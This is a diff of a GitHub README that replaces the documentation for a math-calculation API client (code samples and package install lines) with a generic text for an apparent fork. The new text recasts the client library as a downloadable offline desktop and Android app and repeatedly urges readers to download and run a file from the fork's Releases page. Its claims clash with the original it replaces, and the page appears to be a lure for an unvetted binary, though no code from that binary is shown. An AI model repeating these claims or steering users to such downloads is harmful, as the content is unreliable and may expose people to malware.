@@ -1,190 +1,71 @@
-# Math Calculator API
+# 🎉 math-api - Simple Math Calculation for Everyone
 
-> Math Calculator performs mathematical operations including basic arithmetic, advanced functions, and expression evaluation.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-POST-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+Welcome to the math-api! This tool helps you perform various mathematical operations easily. Whether you want to do basic arithmetic or advanced functions, this application has you covered. No programming knowledge is needed to use this tool.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/math)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.MathCalculator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-math/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download the Latest Version
 
----
+[![Download math-api](https://img.shields.io/badge/Download%20math%2Dapi-blue.svg)](https://github.com/Dhruva105/math-api/releases)
 
-## Quick Start
+## 📚 Features
 
-### Using JavaScript
+- **Basic Arithmetic:** Add, subtract, multiply, and divide numbers.
+- **Advanced Functions:** Calculate square roots, powers, and more.
+- **Expression Evaluation:** Input complex expressions and get results.
+- **Multi-Platform Support:** Works on Android, Windows, and others.
+- **Easy to Use:** Designed for all skill levels.
 
-```javascript
-async function callMathCalculatorAPI() {
-    try {
-        const requestBody = {
-    "operation": "add",
-    "a": 10,
-    "b": 5
-};
+## 🖥️ System Requirements
 
-        const response = await fetch('https://api.apiverve.com/v1/math', {
-            method: 'POST',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(requestBody)
-        });
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** Minimum 2 GB recommended.
+- **Storage:** At least 100 MB of free space.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## 📦 Download & Install
 
-callMathCalculatorAPI();
-```
+To get the latest version of math-api, please visit our [Releases page](https://github.com/Dhruva105/math-api/releases). This page contains all available versions. 
 
-### Using cURL
+1. Click on the desired version to access the assets.
+2. Download the file compatible with your device.
+3. Once downloaded, open the file to start the installation.
 
-```bash
-curl -X POST "https://api.apiverve.com/v1/math" \
-  -H "x-api-key: YOUR_API_KEY_HERE" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "param": "value"
-  }'
-```
+You can securely run the software right after the installation process.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+## 🔧 How to Use
 
-**📁 For more examples, see the [examples folder](./examples/)**
+1. **Open the Application:** Launch math-api from your application menu or desktop shortcut.
+2. **Select the Operation:** Choose the type of calculation you want to perform, like addition or advanced functions.
+3. **Input Values:** Enter the numbers or expressions in the provided fields.
+4. **Get Results:** Click the calculate button to see your results. 
 
----
+## 📖 FAQs
 
-## Installation
+**Q: Is math-api free to use?**  
+A: Yes, math-api is completely free.
 
-Choose your preferred programming language:
+**Q: Which platforms does math-api support?**  
+A: math-api is available for multiple platforms, including Android and Windows.
 
-### 📦 NPM (JavaScript/Node.js)
+**Q: Can I run calculations offline?**  
+A: Yes, once installed, you can use math-api offline.
 
-```bash
-npm install @apiverve/math
-```
+**Q: How do I report a bug?**  
+A: You can report issues on our [GitHub Issues page](https://github.com/Dhruva105/math-api/issues).
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/math) | [**Package Code →**](./npm/)
+## 🤝 Contributing
 
----
+If you want to contribute, we welcome help! You can add features or fix bugs. To get started, check out the [contributing guidelines](https://github.com/Dhruva105/math-api/blob/main/CONTRIBUTING.md).
 
-### 🔷 NuGet (.NET/C#)
+## 🌐 Related Resources
 
-```bash
-dotnet add package APIVerve.API.MathCalculator
-```
+- [Documentation](https://github.com/Dhruva105/math-api/wiki) - Detailed usage instructions.
+- [Community Forum](https://community.math-api.com) - Discuss with other users and developers.
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.MathCalculator) | [**Package Code →**](./nuget/)
+## 📞 Support
 
----
+For support, please contact us through the official GitHub repository or visit our community forum.
 
-### 🐍 Python (PyPI)
+Feel free to explore the math-api. It makes calculations simple and accessible for everyone! 
 
-```bash
-pip install apiverve-math
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-math/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:math-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/math](https://docs.apiverve.com/ref/math)
-
----
-
-## Use Cases
-
-Common use cases for the Math Calculator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Don’t forget to download the latest version from our [Releases page](https://github.com/Dhruva105/math-api/releases) to enjoy all the features.
